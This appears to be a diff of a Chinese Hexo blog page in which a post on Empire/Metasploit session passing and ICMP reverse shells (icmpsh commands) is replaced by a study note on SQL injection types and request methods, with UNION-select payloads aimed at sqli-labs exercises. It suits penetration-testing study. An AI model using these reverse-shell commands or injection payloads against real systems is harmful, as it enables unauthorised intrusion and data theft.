@@ -5,17 +5,17 @@
   
 
   
-  <title>empire会话传递和代理 | Hexo</title>
+  <title>sql注入请求方法 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="empire会话传递 获取session(特权用户传递会继承到特权) 进入msf模块: exploit&#x2F;multi&#x2F;script&#x2F;web_delivery  –&gt; target: PSH –&gt; paylaod: windows&#x2F;meterpreter&#x2F;reverse_tcp –&gt; 监听 使用模块: code_execution&#x2F;invoke_metasploitpayload –">
+  <meta name="description" content="参数类型1、数字类型select * from user where id&#x3D;12、字符类型select * from user where name&#x3D;’yucedu’过滤’(单引号)和”(双引号)3、搜索类型select * from user where name like ‘%yucedu%’    只要有yucedu都会被搜索出来过滤%(百分号)和’(单引号)4、JSON类型★post提交方">
 <meta property="og:type" content="article">
-<meta property="og:title" content="empire会话传递和代理">
-<meta property="og:url" content="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/index.html">
+<meta property="og:title" content="sql注入请求方法">
+<meta property="og:url" content="http://yoursite.com/2021/09/27/sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="empire会话传递 获取session(特权用户传递会继承到特权) 进入msf模块: exploit&#x2F;multi&#x2F;script&#x2F;web_delivery  –&gt; target: PSH –&gt; paylaod: windows&#x2F;meterpreter&#x2F;reverse_tcp –&gt; 监听 使用模块: code_execution&#x2F;invoke_metasploitpayload –">
+<meta property="og:description" content="参数类型1、数字类型select * from user where id&#x3D;12、字符类型select * from user where name&#x3D;’yucedu’过滤’(单引号)和”(双引号)3、搜索类型select * from user where name like ‘%yucedu%’    只要有yucedu都会被搜索出来过滤%(百分号)和’(单引号)4、JSON类型★post提交方">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-08-24T04:23:30.000Z">
-<meta property="article:modified_time" content="2021-08-24T04:24:21.650Z">
+<meta property="article:published_time" content="2021-09-27T11:44:29.000Z">
+<meta property="article:modified_time" content="2021-09-27T11:49:13.938Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -66,10 +66,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-empire会话传递和代理" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-sql注入类型和请求方法" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" class="article-date">
-  <time datetime="2021-08-24T04:23:30.000Z" itemprop="datePublished">2021-08-24</time>
+    <a href="/2021/09/27/sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" class="article-date">
+  <time datetime="2021-09-27T11:44:29.000Z" itemprop="datePublished">2021-09-27</time>
 </a>
     
   </div>
@@ -80,7 +80,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      empire会话传递和代理
+      sql注入请求方法
     </h1>
   
 
@@ -88,30 +88,18 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="empire会话传递"><a href="#empire会话传递" class="headerlink" title="empire会话传递"></a>empire会话传递</h2><ol>
-<li>获取session(特权用户传递会继承到特权)</li>
-<li>进入msf模块: <code>exploit/multi/script/web_delivery </code> –&gt; target: PSH –&gt; paylaod: windows/meterpreter/reverse_tcp –&gt; 监听</li>
-<li>使用模块: <code>code_execution/invoke_metasploitpayload</code> –&gt; 设置Agent, URL(根据msf生成的url去设置)</li>
-<li>执行传递</li>
-</ol>
-<h2 id="端口转发和代理"><a href="#端口转发和代理" class="headerlink" title="端口转发和代理"></a>端口转发和代理</h2><p>Windows: <code>mstsc</code></p>
-<p>linux: <code>rdesktop</code></p>
-<h4 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h4><h5 id="ICMPSH"><a href="#ICMPSH" class="headerlink" title="ICMPSH"></a>ICMPSH</h5><p><code>需要在同网段下去做, 如果端口受到限制, 那我们就可以用ICMPSH这款工具去反弹shell</code></p>
-<p><code>前提: ping未被禁用</code></p>
-<p>依赖环境: python-impacket(python2版本的) <code>pip2 install impacket</code></p>
-<p>icmsh_m.py 源IP 目标IP</p>
-<p>icmpsh.exe:</p>
-<p>-t target –&gt; 源IP</p>
-<p>-d delay <code>500</code> –&gt; 延迟的毫秒数</p>
-<p>-s bytes  <code>128</code> –&gt; 缓冲区的大小</p>
-<p>-b max blank <code>30</code> –&gt; 最大的空白数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 现在kali设置ping代替应答</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1 &gt;&#x2F;dev&#x2F;null</span><br><span class="line">2. 开启监听</span><br><span class="line">icmpsh_m.py s_ip d_ip</span><br><span class="line">3. 反弹shell</span><br><span class="line">icmpsh.exe -t s_ip -d 500 -s 128 -b 30</span><br></pre></td></tr></table></figure>
-
+        <h4 id="参数类型"><a href="#参数类型" class="headerlink" title="参数类型"></a>参数类型</h4><p>1、数字类型<br>select * from user where id=1<br>2、字符类型<br>select * from user where name=’yucedu’<br>过滤’(单引号)和”(双引号)<br>3、搜索类型<br>select * from user where name like ‘%yucedu%’    只要有yucedu都会被搜索出来<br>过滤%(百分号)和’(单引号)<br>4、JSON类型<br>★post提交方式中的一种数据交互格式<br>   JSON格式：<br>      json={“name”:”yucedu”<br>    “age”:”18”}</p>
+<p>必须将语句的符号闭合，使注入语句生效<br>注释符号：–+,#   有时候–+用不了就用#</p>
+<p>$id=$_GET[‘id’];<br>?id=1 and 1=2 union select 1,2,3–+<br>$sql=”SELECT * FROM users WHERE id=’1 and 1=2 union select 1,2,3–+’ LIMIT 0,1”;<br>?id=1’ and 1=2 union select 1,2,3–+<br>$sql=”SELECT * FROM users WHERE id=’1’ and 1=2 union select 1,2,3–+’ LIMIT 0,1”;</p>
+<h5 id="SQL语句干扰符号"><a href="#SQL语句干扰符号" class="headerlink" title="SQL语句干扰符号"></a>SQL语句干扰符号</h5><p>​     ‘(单引号)，”(双引号)，%(百分号)，)(小括号)，}(大括号) 等，具体需看写法</p>
+<h4 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h4><p>GET、POST、COOKIE、REQUEST、HTTP头部等</p>
+<p>GET请求传输的数据量限制在2KB左右<br>GET只要在url上，就能接收到请求<br>REQUEST请求不管是GET和POST都可以<br>HTTP报文头部各个参数都能注入，比如User-Agent、Cookie</p>
+<h4 id="演示实验"><a href="#演示实验" class="headerlink" title="演示实验"></a>演示实验</h4><p> 参数字符型注入测试   sqlilabs Less-1,2,3,4<br> POST数据提交注入测试   sqliabs Less-11<br> COOKIE数据提交注入测试   sqlilabs Less-20<br> HTTP头部参数数据注入测试   sqlilabs Less-18<br> 参数JSON数据注入测试     <a target="_blank" rel="noopener" href="https://tianchi.aliyun.com/competition/entrance/531796/information">https://tianchi.aliyun.com/competition/entrance/531796/information</a><br>      $sql=”select * from users where username=’{&amp;username}’”;<br>       json={“username”:”admin’ and 1=2 union select 1,2,3#”}        ‘ (单引号)闭合的是SQL语句中的 ‘   </p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="cku2l99z2000azgvj2g9oauu8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/27/sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" data-id="cku2l99zm000jzgvj609w5v1i" class="article-share-link">Share</a>
       
       
     </footer>
@@ -120,19 +108,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          端口转发和代理
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/09/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">empire提权和持久化</div>
+      <div class="article-nav-title">sql注入基础</div>
     </a>
   
 </nav>
